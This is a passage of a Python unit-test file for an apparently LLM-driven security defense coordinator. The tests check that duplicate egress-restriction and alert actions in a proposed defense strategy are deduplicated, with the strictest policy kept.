                target="svc-a",
                parameters={"policy": "deny-untrusted-egress"},
            ),
            DefenseAction(
                type=ActionType.RESTRICT_EGRESS,
                target="svc-a",
                parameters={"policy": "block-all-outbound"},
            ),
        ],
        scope=StrategyScope(assets=["svc-a"], namespaces=["default"]),
        ttl=1800,
        rollbackPlan=RollbackPlan(planId="rb-dedup", steps=["rollback"], triggerCondition="manual"),
        confidence=0.92,
        rationale="dup egress",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    return DebateState(
        debateId="deb-dedup-re",
        securityEvent=event,
        plannerProposal=proposal,
        unresolvedChallenges=[],
        round=2,
        maxRounds=2,
    )


def test_coordinator_deduplicates_restrict_egress_same_bucket_keeps_strictest():
    state = _state_duplicate_restrict_egress()
    out = CoordinatorAgent(MockLLMClient()).run(state)
    strat = out.revisedProposal or out.plannerProposal
    assert strat is not None
    assert len(strat.actions) == 1
    assert strat.actions[0].type == ActionType.RESTRICT_EGRESS
    assert strat.actions[0].parameters.get("policy") == "block-all-outbound"
    assert "deduplicated_actions_count=1" in strat.rationale
    assert any(c.startswith("deduplicated_actions_count=") for c in out.finalDecision.executionConstraints)


def test_coordinator_deduplicates_identical_alert_only_to_single_entry():
    event = SecurityEvent(
        eventId="evt-dedup-alert-001",
        sourceType="EDR",
        subject="pod/x",
        action="probe",
        object="/",
        context={},
        severity=Severity.LOW,
        riskScore=0.2,
        labels=[],
    )
    proposal = DefenseStrategy(
        strategyId="stg-dedup-alert",
        threatType=ThreatType.UNKNOWN,
        targetLayer=TargetLayer.WORKLOAD,
        actions=[
            DefenseAction(
                type=ActionType.ALERT_ONLY,
                target="svc-z",
                parameters={"reason": "audit_dup"},
            ),
            DefenseAction(
                type=ActionType.ALERT_ONLY,
                target="svc-z",
                parameters={"reason": "audit_dup"},
            ),
        ],
        scope=StrategyScope(assets=["svc-z"], namespaces=["default"]),
        ttl=600,
        rollbackPlan=RollbackPlan(planId="rb-a", steps=[], triggerCondition="manual"),
        confidence=0.95,
        rationale="dup alerts",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    state = DebateState(
        debateId="deb-dedup-alert",
        securityEvent=event,
        plannerProposal=proposal,
        unresolvedChallenges=[],
        round=2,
        maxRounds=2,
    )
    out = CoordinatorAgent(MockLLMClient()).run(state)
    strat = out.plannerProposal
    assert strat is not None
    assert len(strat.actions) == 1
    assert strat.actions[0].type == ActionType.ALERT_ONLY


def test_coordinator_keeps_distinct_alert_only_actions():
    event = SecurityEvent(
        eventId="evt-two-alerts",
        sourceType="EDR",
        subject="pod/x",
        action="x",
        object="y",
        context={},
        severity=Severity.LOW,
        riskScore=0.3,
        labels=[],
    )
    proposal = DefenseStrategy(
        strategyId="stg-two-alerts",
        threatType=ThreatType.UNKNOWN,
        targetLayer=TargetLayer.WORKLOAD,
        actions=[
            DefenseAction(
                type=ActionType.ALERT_ONLY,
                target="svc-z",
                parameters={"reason": "a"},
            ),
            DefenseAction(
                type=ActionType.ALERT_ONLY,
                target="svc-z",
                parameters={"reason": "b"},
            ),
        ],
        scope=StrategyScope(assets=["svc-z"], namespaces=["default"]),
        ttl=600,
        rollbackPlan=RollbackPlan(planId="rb-b", steps=[], triggerCondition="manual"),
        confidence=0.95,
        rationale="two alerts",
        generatedBy=GeneratedBy.PLANNER,
        approved=False,
    )
    state = DebateState(
        debateId="deb-two-alerts",
        securityEvent=event,
        plannerProposal=proposal,
        unresolvedChallenges=[],
        round=2,
        maxRounds=2,
    )
    out = CoordinatorAgent(MockLLMClient()).run(state)
    strat = out.plannerProposal
    assert strat is not None
    assert len(strat.actions) == 2
